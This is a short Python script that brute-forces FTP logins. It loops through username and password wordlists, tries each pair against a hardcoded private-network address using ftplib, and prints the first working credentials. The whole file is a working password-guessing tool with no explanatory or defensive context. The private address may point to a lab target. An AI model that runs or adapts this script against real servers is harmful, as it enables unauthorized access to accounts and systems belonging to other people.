import ftplib

def brute(ip, user, pwd):
    ftp = ftplib.FTP(ip)
    try:
        ftp.login(user, pwd)
        ftp.quit()
        return True
    except:
        return False
        

def main():
    ip = '192.168.0.20'
    user_wdlist = 'users.txt'
    pwd_wdlist = 'passwords.txt'
    users = open(user_wdlist, 'r')
    users = users.read().split('\n')
    passwords = open(pwd_wdlist, 'r')
    passwords = passwords.read().split('\n')


    for user in users:
        found = False

        for pwd in passwords:
            if (brute(ip, user, pwd)):
                print('Credentials found')
                print('User: {}\tPassword: {}'.format(user, pwd))
                found = True
                break
            else:
                print('Failed')

        if found:
            break
            

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
    